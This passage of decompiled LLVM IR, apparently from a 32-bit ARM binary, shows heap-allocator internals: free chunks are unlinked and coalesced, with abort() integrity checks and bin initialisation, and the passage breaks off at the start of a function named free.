  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14ee8 = load i32, i32* @r4, align 4
  store i32 %v3_14ee8, i32* %stack_var_-36, align 4
  %v0_14eec = load i32, i32* @r0, align 4
  %v1_14eec = inttoptr i32 %v0_14eec to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %r3.global-to-local, align 4
  %v2_14ef0 = icmp eq i32 %v2_14eec, 0
  store i32 %v0_14eec, i32* @r4, align 4
  br i1 %v2_14ef0, label %dec_label_pc_15028.preheader, label %dec_label_pc_14f04

dec_label_pc_15028.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1503025 = add i32 %v0_14eec, 52
  store i32 %v1_1503025, i32* %r3.global-to-local, align 4
  %v2_1503826 = add i32 %v0_14eec, 60
  %v3_1503827 = inttoptr i32 %v2_1503826 to i32*
  store i32 %v1_1503025, i32* %v3_1503827, align 4
  %v0_1503c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1503c29 = add i32 %v0_1503c28, 12
  %v3_1503c30 = inttoptr i32 %v2_1503c29 to i32*
  store i32 %v0_1503c28, i32* %v3_1503c30, align 4
  br label %dec_label_pc_15028.dec_label_pc_15028_crit_edge

dec_label_pc_14f04:                               ; preds = %entry
  %v1_14f04 = and i32 %v2_14eec, -3
  %v3_14f08 = udiv i32 %v2_14eec, 8
  store i32 %v3_14f08, i32* %r2.global-to-local, align 4
  store i32 %v1_14f04, i32* %v1_14eec, align 4
  %v0_14f10 = load i32, i32* @r0, align 4
  %v1_14f10 = add i32 %v0_14f10, -4
  store i32 %v1_14f10, i32* %r3.global-to-local, align 4
  %v1_14f14 = load i32, i32* %r2.global-to-local, align 4
  %v4_14f14 = mul i32 %v1_14f14, 4
  %v5_14f14 = add i32 %v4_14f14, %v1_14f10
  store i32 %v5_14f14, i32* %sb.global-to-local, align 4
  %v1_14f18 = add i32 %v0_14f10, 52
  store i32 %v1_14f18, i32* %r7.global-to-local, align 4
  %v1_14f1c = add i32 %v0_14f10, 4
  store i32 %v1_14f1c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %dec_label_pc_15020, %dec_label_pc_14f04
  %v1_1501810 = phi i32 [ %v1_15018, %dec_label_pc_15020 ], [ %v5_14f14, %dec_label_pc_14f04 ]
  %v1_14f30 = phi i32 [ %v1_15020, %dec_label_pc_15020 ], [ %v1_14f1c, %dec_label_pc_14f04 ]
  %v1_14f24 = inttoptr i32 %v1_14f30 to i32*
  %v2_14f24 = load i32, i32* %v1_14f24, align 4
  store i32 %v2_14f24, i32* %r1.global-to-local, align 4
  %v2_14f28 = icmp eq i32 %v2_14f24, 0
  br i1 %v2_14f28, label %dec_label_pc_15018, label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f24
  %v0_14f30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14f30, i32* %v1_14f24, align 4
  %v0_14f34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_14f30
  %v0_14f50 = phi i32 [ %v0_1500c, %dec_label_pc_1500c ], [ %v0_14f34.pre, %dec_label_pc_14f30 ]
  %v1_14f34 = add i32 %v0_14f50, 4
  %v2_14f34 = inttoptr i32 %v1_14f34 to i32*
  %v3_14f34 = load i32, i32* %v2_14f34, align 4
  store i32 %v3_14f34, i32* %r3.global-to-local, align 4
  %v1_14f38 = and i32 %v3_14f34, -2
  store i32 %v1_14f38, i32* %lr.global-to-local, align 4
  %v2_14f3c = add i32 %v1_14f38, %v0_14f50
  store i32 %v2_14f3c, i32* @r0, align 4
  %v1_14f40 = urem i32 %v3_14f34, 2
  %v2_14f40 = icmp eq i32 %v1_14f40, 0
  %v1_14f44 = add i32 %v0_14f50, 8
  %v2_14f44 = inttoptr i32 %v1_14f44 to i32*
  %v3_14f44 = load i32, i32* %v2_14f44, align 4
  store i32 %v3_14f44, i32* %sl.global-to-local, align 4
  %v1_14f48 = add i32 %v2_14f3c, 4
  %v2_14f48 = inttoptr i32 %v1_14f48 to i32*
  %v3_14f48 = load i32, i32* %v2_14f48, align 4
  store i32 %v3_14f48, i32* %r8.global-to-local, align 4
  br i1 %v2_14f40, label %dec_label_pc_14f50, label %dec_label_pc_14f84

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14f34
  %v1_14f50 = inttoptr i32 %v0_14f50 to i32*
  %v2_14f50 = load i32, i32* %v1_14f50, align 4
  store i32 %v2_14f50, i32* %r5.global-to-local, align 4
  %v2_14f54 = sub i32 %v0_14f50, %v2_14f50
  store i32 %v2_14f54, i32* %r3.global-to-local, align 4
  %v1_14f58 = add i32 %v2_14f54, 8
  %v2_14f58 = inttoptr i32 %v1_14f58 to i32*
  %v3_14f58 = load i32, i32* %v2_14f58, align 4
  store i32 %v3_14f58, i32* @ip, align 4
  %v1_14f5c = add i32 %v3_14f58, 12
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  store i32 %v3_14f5c, i32* %r1.global-to-local, align 4
  %v9_14f60 = icmp eq i32 %v3_14f5c, %v2_14f54
  %v1_14f64 = add i32 %v2_14f54, 12
  %v2_14f64 = inttoptr i32 %v1_14f64 to i32*
  %v3_14f64 = load i32, i32* %v2_14f64, align 4
  store i32 %v3_14f64, i32* %r2.global-to-local, align 4
  br i1 %v9_14f60, label %dec_label_pc_14f6c, label %dec_label_pc_14fc8

dec_label_pc_14f6c:                               ; preds = %dec_label_pc_14f50
  %v1_14f6c = add i32 %v3_14f64, 8
  %v2_14f6c = inttoptr i32 %v1_14f6c to i32*
  %v3_14f6c = load i32, i32* %v2_14f6c, align 4
  store i32 %v3_14f6c, i32* %r3.global-to-local, align 4
  %v9_14f70 = icmp eq i32 %v3_14f6c, %v2_14f54
  br i1 %v9_14f70, label %dec_label_pc_14f78, label %dec_label_pc_14fc8

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f6c
  store i32 %v3_14f58, i32* %v2_14f6c, align 4
  %v0_14f7c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f7c = load i32, i32* @ip, align 4
  %v2_14f7c = add i32 %v1_14f7c, 12
  %v3_14f7c = inttoptr i32 %v2_14f7c to i32*
  store i32 %v0_14f7c, i32* %v3_14f7c, align 4
  %v0_14f80 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f80 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f80 = add i32 %v1_14f80, %v0_14f80
  store i32 %v2_14f80, i32* %lr.global-to-local, align 4
  %v0_14f88.pre = load i32, i32* @r0, align 4
  %v0_14f8c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f34, %dec_label_pc_14f78
  %v0_14ffc = phi i32 [ %v1_14f38, %dec_label_pc_14f34 ], [ %v2_14f80, %dec_label_pc_14f78 ]
  %v0_14f8c = phi i32 [ %v3_14f48, %dec_label_pc_14f34 ], [ %v0_14f8c.pre, %dec_label_pc_14f78 ]
  %v1_14fa0 = phi i32 [ %v2_14f3c, %dec_label_pc_14f34 ], [ %v0_14f88.pre, %dec_label_pc_14f78 ]
  %v0_14f84 = load i32, i32* @r4, align 4
  %v1_14f84 = add i32 %v0_14f84, 44
  %v2_14f84 = inttoptr i32 %v1_14f84 to i32*
  %v3_14f84 = load i32, i32* %v2_14f84, align 4
  store i32 %v3_14f84, i32* %r3.global-to-local, align 4
  %v9_14f88 = icmp eq i32 %v1_14fa0, %v3_14f84
  %v1_14f8c = and i32 %v0_14f8c, -4
  store i32 %v1_14f8c, i32* %r5.global-to-local, align 4
  br i1 %v9_14f88, label %dec_label_pc_14ffc, label %dec_label_pc_14f94

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14f84
  %v2_14f94 = add i32 %v1_14fa0, %v1_14f8c
  store i32 %v2_14f94, i32* %r3.global-to-local, align 4
  %v1_14f98 = add i32 %v2_14f94, 4
  %v2_14f98 = inttoptr i32 %v1_14f98 to i32*
  %v3_14f98 = load i32, i32* %v2_14f98, align 4
  store i32 %v3_14f98, i32* %r3.global-to-local, align 4
  %v1_14f9c = urem i32 %v3_14f98, 2
  %v2_14f9c = icmp eq i32 %v1_14f9c, 0
  %v2_14fa0 = add i32 %v1_14fa0, 4
  %v3_14fa0 = inttoptr i32 %v2_14fa0 to i32*
  store i32 %v1_14f8c, i32* %v3_14fa0, align 4
  br i1 %v2_14f9c, label %dec_label_pc_14fa8, label %dec_label_pc_14f94.dec_label_pc_14fd8_crit_edge

dec_label_pc_14f94.dec_label_pc_14fd8_crit_edge:  ; preds = %dec_label_pc_14f94
  %v0_14fdc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14fd8

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f94
  %v0_14fa8 = load i32, i32* @r0, align 4
  %v1_14fa8 = add i32 %v0_14fa8, 8
  %v2_14fa8 = inttoptr i32 %v1_14fa8 to i32*
  %v3_14fa8 = load i32, i32* %v2_14fa8, align 4
  store i32 %v3_14fa8, i32* @ip, align 4
  %v1_14fac = add i32 %v3_14fa8, 12
  %v2_14fac = inttoptr i32 %v1_14fac to i32*
  %v3_14fac = load i32, i32* %v2_14fac, align 4
  store i32 %v3_14fac, i32* %r3.global-to-local, align 4
  %v9_14fb0 = icmp eq i32 %v3_14fac, %v0_14fa8
  %v1_14fb4 = add i32 %v0_14fa8, 12
  %v2_14fb4 = inttoptr i32 %v1_14fb4 to i32*
  %v3_14fb4 = load i32, i32* %v2_14fb4, align 4
  store i32 %v3_14fb4, i32* %r2.global-to-local, align 4
  br i1 %v9_14fb0, label %dec_label_pc_14fbc, label %dec_label_pc_14fc8

dec_label_pc_14fbc:                               ; preds = %dec_label_pc_14fa8
  %v1_14fbc = add i32 %v3_14fb4, 8
  %v2_14fbc = inttoptr i32 %v1_14fbc to i32*
  %v3_14fbc = load i32, i32* %v2_14fbc, align 4
  store i32 %v3_14fbc, i32* %r3.global-to-local, align 4
  %v9_14fc0 = icmp eq i32 %v3_14fbc, %v0_14fa8
  br i1 %v9_14fc0, label %dec_label_pc_14fcc, label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14fa8, %dec_label_pc_14f6c, %dec_label_pc_14f50, %dec_label_pc_14fbc
  %v0_14fc8 = call i32 @abort()
  store i32 %v0_14fc8, i32* @r0, align 4
  %v0_14fcc.pre = load i32, i32* @ip, align 4
  %v1_14fcc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14fcc

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fbc, %dec_label_pc_14fc8
  %v1_14fcc = phi i32 [ %v3_14fb4, %dec_label_pc_14fbc ], [ %v1_14fcc.pre, %dec_label_pc_14fc8 ]
  %v0_14fcc = phi i32 [ %v3_14fa8, %dec_label_pc_14fbc ], [ %v0_14fcc.pre, %dec_label_pc_14fc8 ]
  %v2_14fcc = add i32 %v1_14fcc, 8
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v0_14fcc, i32* %v3_14fcc, align 4
  %v0_14fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd0 = load i32, i32* @ip, align 4
  %v2_14fd0 = add i32 %v1_14fd0, 12
  %v3_14fd0 = inttoptr i32 %v2_14fd0 to i32*
  store i32 %v0_14fd0, i32* %v3_14fd0, align 4
  %v0_14fd4 = load i32, i32* %lr.global-to-local, align 4
  %v1_14fd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14fd4 = add i32 %v1_14fd4, %v0_14fd4
  store i32 %v2_14fd4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14f94.dec_label_pc_14fd8_crit_edge, %dec_label_pc_14fcc
  %v0_14fdc = phi i32 [ %v0_14fdc.pre, %dec_label_pc_14f94.dec_label_pc_14fd8_crit_edge ], [ %v2_14fd4, %dec_label_pc_14fcc ]
  %v0_14fd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_14fd8 = add i32 %v0_14fd8, 8
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i32*
  %v3_14fd8 = load i32, i32* %v2_14fd8, align 4
  store i32 %v3_14fd8, i32* %r2.global-to-local, align 4
  %v1_14fdc = or i32 %v0_14fdc, 1
  store i32 %v1_14fdc, i32* %r3.global-to-local, align 4
  %v0_14fe0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14fe0, i32* %v2_14fd8, align 4
  %v0_14fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fe4 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fe4 = add i32 %v1_14fe4, 12
  %v3_14fe4 = inttoptr i32 %v2_14fe4 to i32*
  store i32 %v0_14fe4, i32* %v3_14fe4, align 4
  %v0_14fe8 = load i32, i32* %lr.global-to-local, align 4
  %v1_14fe8 = load i32, i32* %r1.global-to-local, align 4
  %v3_14fe8 = add i32 %v1_14fe8, %v0_14fe8
  %v4_14fe8 = inttoptr i32 %v3_14fe8 to i32*
  store i32 %v0_14fe8, i32* %v4_14fe8, align 4
  %v0_14fec = load i32, i32* %r3.global-to-local, align 4
  %v1_14fec = load i32, i32* %r1.global-to-local, align 4
  %v2_14fec = add i32 %v1_14fec, 4
  %v3_14fec = inttoptr i32 %v2_14fec to i32*
  store i32 %v0_14fec, i32* %v3_14fec, align 4
  %v0_14ff0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ff0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ff0 = add i32 %v1_14ff0, 8
  %v3_14ff0 = inttoptr i32 %v2_14ff0 to i32*
  store i32 %v0_14ff0, i32* %v3_14ff0, align 4
  %v0_14ff4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14ff4 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ff4 = add i32 %v1_14ff4, 12
  %v3_14ff4 = inttoptr i32 %v2_14ff4 to i32*
  store i32 %v0_14ff4, i32* %v3_14ff4, align 4
  br label %dec_label_pc_1500c

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14f84
  %v2_14ffc = add i32 %v1_14f8c, %v0_14ffc
  %v1_15000 = or i32 %v2_14ffc, 1
  store i32 %v1_15000, i32* %r3.global-to-local, align 4
  %v1_15004 = load i32, i32* %r1.global-to-local, align 4
  %v2_15004 = add i32 %v1_15004, 4
  %v3_15004 = inttoptr i32 %v2_15004 to i32*
  store i32 %v1_15000, i32* %v3_15004, align 4
  %v0_15008 = load i32, i32* %r1.global-to-local, align 4
  %v1_15008 = load i32, i32* @r4, align 4
  %v2_15008 = add i32 %v1_15008, 44
  %v3_15008 = inttoptr i32 %v2_15008 to i32*
  store i32 %v0_15008, i32* %v3_15008, align 4
  br label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14ffc
  %v0_1500c = load i32, i32* %sl.global-to-local, align 4
  %v2_1500c = icmp eq i32 %v0_1500c, 0
  store i32 %v0_1500c, i32* %r1.global-to-local, align 4
  br i1 %v2_1500c, label %dec_label_pc_15018.loopexit, label %dec_label_pc_14f34

dec_label_pc_15018.loopexit:                      ; preds = %dec_label_pc_1500c
  %v0_15018.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_15018.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_15018.loopexit, %dec_label_pc_14f24
  %v1_15018 = phi i32 [ %v1_15018.pre, %dec_label_pc_15018.loopexit ], [ %v1_1501810, %dec_label_pc_14f24 ]
  %v0_15020 = phi i32 [ %v0_15018.pre, %dec_label_pc_15018.loopexit ], [ %v1_14f30, %dec_label_pc_14f24 ]
  %v9_15018 = icmp eq i32 %v0_15020, %v1_15018
  br i1 %v9_15018, label %dec_label_pc_15090, label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_15018
  %v1_15020 = add i32 %v0_15020, 4
  store i32 %v1_15020, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14f24

dec_label_pc_15028.dec_label_pc_15028_crit_edge:  ; preds = %dec_label_pc_15028.preheader, %dec_label_pc_15028.dec_label_pc_15028_crit_edge
  %v0_15028.pre = load i32, i32* @r4, align 4
  %v1_15028.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_15028 = mul i32 %v1_15028.pre, 8
  %v5_15028 = add i32 %v4_15028, %v0_15028.pre
  %v1_1502c = add i32 %v1_15028.pre, 1
  store i32 %v1_1502c, i32* %r2.global-to-local, align 4
  %v1_15030 = add i32 %v5_15028, 44
  store i32 %v1_15030, i32* %r3.global-to-local, align 4
  %v2_15038 = add i32 %v5_15028, 52
  %v3_15038 = inttoptr i32 %v2_15038 to i32*
  store i32 %v1_15030, i32* %v3_15038, align 4
  %v0_1503c = load i32, i32* %r3.global-to-local, align 4
  %v2_1503c = add i32 %v0_1503c, 12
  %v3_1503c = inttoptr i32 %v2_1503c to i32*
  store i32 %v0_1503c, i32* %v3_1503c, align 4
  %v7_15040 = icmp sgt i32 %v1_1502c, 95
  br i1 %v7_15040, label %dec_label_pc_15044, label %dec_label_pc_15028.dec_label_pc_15028_crit_edge

dec_label_pc_15044:                               ; preds = %dec_label_pc_15028.dec_label_pc_15028_crit_edge
  %v0_15044 = load i32, i32* @r4, align 4
  %v1_15044 = inttoptr i32 %v0_15044 to i32*
  %v2_15044 = load i32, i32* %v1_15044, align 4
  store i32 %v2_15044, i32* %r2.global-to-local, align 4
  %v1_15048 = add i32 %v0_15044, 864
  %v2_15048 = inttoptr i32 %v1_15048 to i32*
  %v3_15048 = load i32, i32* %v2_15048, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15050 = urem i32 %v2_15044, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_15058 = or i32 %v3_15048, 1
  store i32 %v1_15058, i32* %r1.global-to-local, align 4
  %v1_1505c = or i32 %v1_15050, 72
  store i32 %v1_1505c, i32* %r2.global-to-local, align 4
  %v1_15060 = add i32 %v0_15044, 52
  store i32 %v1_15060, i32* @ip, align 4
  %v2_15064 = add i32 %v0_15044, 840
  %v3_15064 = inttoptr i32 %v2_15064 to i32*
  store i32 0, i32* %v3_15064, align 4
  %v0_15068 = load i32, i32* %r3.global-to-local, align 4
  %v1_15068 = add i32 %v0_15068, 65536
  store i32 %v1_15068, i32* %r3.global-to-local, align 4
  %v0_1506c = load i32, i32* %r0.global-to-local, align 4
  %v1_1506c = load i32, i32* @r4, align 4
  %v2_1506c = add i32 %v1_1506c, 836
  %v3_1506c = inttoptr i32 %v2_1506c to i32*
  store i32 %v0_1506c, i32* %v3_1506c, align 4
  %v0_15070 = load i32, i32* %r0.global-to-local, align 4
  %v1_15070 = load i32, i32* @r4, align 4
  %v2_15070 = add i32 %v1_15070, 844
  %v3_15070 = inttoptr i32 %v2_15070 to i32*
  store i32 %v0_15070, i32* %v3_15070, align 4
  %v1_15074 = load i32, i32* @r4, align 4
  %v2_15074 = add i32 %v1_15074, 852
  %v3_15074 = inttoptr i32 %v2_15074 to i32*
  store i32 %v1_15068, i32* %v3_15074, align 4
  %v1_15078 = load i32, i32* @r4, align 4
  %v2_15078 = add i32 %v1_15078, 864
  %v3_15078 = inttoptr i32 %v2_15078 to i32*
  store i32 %v1_15058, i32* %v3_15078, align 4
  %v1_1507c = load i32, i32* @r4, align 4
  %v2_1507c = inttoptr i32 %v1_1507c to i32*
  store i32 %v1_1505c, i32* %v2_1507c, align 4
  %v0_15080 = load i32, i32* @ip, align 4
  %v1_15080 = load i32, i32* @r4, align 4
  %v2_15080 = add i32 %v1_15080, 44
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  store i32 %v0_15080, i32* %v3_15080, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_15088 = call i32 @sysconf(i32 30, i32 %v1_15058, i32 %v1_1505c, i32 %v1_15068)
  store i32 %v4_15088, i32* @r0, align 4
  %v1_1508c = load i32, i32* @r4, align 4
  %v2_1508c = add i32 %v1_1508c, 860
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %v4_15088, i32* %v3_1508c, align 4
  br label %dec_label_pc_15090

dec_label_pc_15090:                               ; preds = %dec_label_pc_15018, %dec_label_pc_15044
  %v2_15094 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15094, i32* @r4, align 4
  %v1_15098 = load i32, i32* @r0, align 4
  ret i32 %v1_15098

; uselistorder directives
  uselistorder i32 %v0_15044, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1503c, { 1, 0 }
  uselistorder i32 %v1_15020, { 1, 0 }
  uselistorder i32 %v0_1500c, { 0, 2, 1 }
  uselistorder i32 %v0_14fe8, { 1, 0 }
  uselistorder i32 %v1_14f38, { 1, 0, 2 }
  uselistorder i32 %v0_14f50, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14f10, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 1, 0, 2, 3 }
  uselistorder i32 30, { 1, 12, 2, 6, 3, 7, 4, 8, 0, 9, 10, 5, 11 }
  uselistorder label %dec_label_pc_15090, { 1, 0 }
  uselistorder label %dec_label_pc_15028.dec_label_pc_15028_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1500c, { 1, 0 }
  uselistorder label %dec_label_pc_14fd8, { 1, 0 }
  uselistorder label %dec_label_pc_14fcc, { 1, 0 }
  uselistorder label %dec_label_pc_14fc8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14f84, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1509c = load i32, i32* @r4, align 4
  %v6_1509c = load i32, i32* @r5, align 4
  %v9_1509c = load i32, i32* @r6, align 4
  %v12_1509c = load i32, i32* @r7, align 4
  %v18_1509c = load i32, i32* @lr, align 4
  %v0_150a4 = load i32, i32* @r0, align 4
  store i32 %v0_150a4, i32* @r6, align 4
  %v2_150a4 = icmp eq i32 %v0_150a4, 0
  %v2_150a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r7, align 4
  br i1 %v2_150a4, label %dec_label_pc_152b0, label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_150b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 108) to i32*), align 4
  store i32 %v4_150b8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_150b8, i32* %r2.global-to-local, align 4
  %v4_150c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), align 4
  store i32 %v4_150c4, i32* %r1.global-to-local, align 4
  store i32 %v2_150a8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_150d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  store i32 %v4_150d0, i32* %ip.global-to-local, align 4
  store i32 86236, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_150d0)
  %v0_150dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_150dc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_150e4 = load i32, i32* @r7, align 4
  %v2_150e4 = add i32 %v0_150e4, 16
  %v3_150e4 = inttoptr i32 %v2_150e4 to i32*
  %v4_150e4 = load i32, i32* %v3_150e4, align 4
  store i32 %v4_150e4, i32* %ip.global-to-local, align 4
  store i32 86256, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_150e4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_150f4 = load i32, i32* @r7, align 4
  %v2_150f4 = add i32 %v0_150f4, 64
  %v3_150f4 = inttoptr i32 %v2_150f4 to i32*
  %v4_150f4 = load i32, i32* %v3_150f4, align 4
  store i32 %v4_150f4, i32* @lr, align 4
  %v0_150f8 = load i32, i32* @r6, align 4
  %v1_150f8 = add i32 %v0_150f8, -4
  %v2_150f8 = inttoptr i32 %v1_150f8 to i32*
  %v3_150f8 = load i32, i32* %v2_150f8, align 4
  store i32 %v3_150f8, i32* %r2.global-to-local, align 4
  %v1_150fc = inttoptr i32 %v4_150f4 to i32*
  %v2_150fc = load i32, i32* %v1_150fc, align 4
  store i32 %v2_150fc, i32* %r3.global-to-local, align 4
  %v1_15100 = and i32 %v3_150f8, -4
  store i32 %v1_15100, i32* %ip.global-to-local, align 4
  %v1_15104 = add i32 %v0_150f8, -8
  store i32 %v1_15104, i32* @r5, align 4
  store i32 %v1_15104, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_15100, %v2_150fc
  br i1 %tmp, label %dec_label_pc_15134, label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_150b4
  %v1_15114 = or i32 %v2_150fc, 3
  store i32 %v1_15114, i32* %r3.global-to-local, align 4
  store i32 %v1_15114, i32* %v1_150fc, align 4
  %v3_15118 = load i32, i32* @lr, align 4
  %v4_15118 = add i32 %v3_15118, -8
  store i32 %v4_15118, i32* %lr.global-to-local, align 4
  %v0_1511c = load i32, i32* %ip.global-to-local, align 4
  %v3_1511c = udiv i32 %v0_1511c, 8
  store i32 %v3_1511c, i32* %r1.global-to-local, align 4
  %v1_15120 = add i32 %v3_15118, -4
  store i32 %v1_15120, i32* %r2.global-to-local, align 4
  %v4_15124 = mul nuw i32 %v3_1511c, 4
  %v5_15124 = add i32 %v4_15124, %v1_15120
  %v6_15124 = inttoptr i32 %v5_15124 to i32*
  %v7_15124 = load i32, i32* %v6_15124, align 4
  store i32 %v7_15124, i32* %r3.global-to-local, align 4
  %v1_15128 = load i32, i32* @r5, align 4
  %v2_15128 = add i32 %v1_15128, 8
  %v3_15128 = inttoptr i32 %v2_15128 to i32*
  store i32 %v7_15124, i32* %v3_15128, align 4
  %v0_1512c = load i32, i32* @r5, align 4
  %v1_1512c = load i32, i32* %r2.global-to-local, align 4
  %v2_1512c = load i32, i32* %r1.global-to-local, align 4
  %v5_1512c = mul i32 %v2_1512c, 4
  %v6_1512c = add i32 %v5_1512c, %v1_1512c
  %v7_1512c = inttoptr i32 %v6_1512c to i32*
  store i32 %v0_1512c, i32* %v7_1512c, align 4
  br label %dec_label_pc_15298

dec_label_pc_15134:                               ; preds = %dec_label_pc_150b4
  %v1_15134 = and i32 %v3_150f8, 2
  %v2_15134 = icmp eq i32 %v1_15134, 0
  br i1 %v2_15134, label %dec_label_pc_1513c, label %dec_label_pc_15270

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15134
  %v1_1513c = or i32 %v2_150fc, 1
  store i32 %v1_1513c, i32* %r3.global-to-local, align 4
  store i32 %v1_1513c, i32* %v1_150fc, align 4
  %v0_15144 = load i32, i32* @r6, align 4
  %v1_15144 = add i32 %v0_15144, -4
  %v2_15144 = inttoptr i32 %v1_15144 to i32*
  %v3_15144 = load i32, i32* %v2_15144, align 4
  store i32 %v3_15144, i32* %r3.global-to-local, align 4
  %v0_15148 = load i32, i32* @r5, align 4
  %v1_15148 = load i32, i32* %ip.global-to-local, align 4
  %v2_15148 = add i32 %v1_15148, %v0_15148
  store i32 %v2_15148, i32* %lr.global-to-local, align 4
  %v1_1514c = urem i32 %v3_15144, 2
  %v2_1514c = icmp eq i32 %v1_1514c, 0
  %v1_15150 = add i32 %v2_15148, 4
  %v2_15150 = inttoptr i32 %v1_15150 to i32*
  %v3_15150 = load i32, i32* %v2_15150, align 4
  store i32 %v3_15150, i32* %r8.global-to-local, align 4
  br i1 %v2_1514c, label %dec_label_pc_15158, label %dec_label_pc_1518c

dec_label_pc_15158:                               ; preds = %dec_label_pc_1513c
  %v1_15158 = add i32 %v0_15144, -8
  %v2_15158 = inttoptr i32 %v1_15158 to i32*
  %v3_15158 = load i32, i32* %v2_15158, align 4
  store i32 %v3_15158, i32* %r1.global-to-local, align 4
  %v2_1515c = sub i32 %v0_15148, %v3_15158
  store i32 %v2_1515c, i32* %r3.global-to-local, align 4
  %v1_15160 = add i32 %v2_1515c, 8
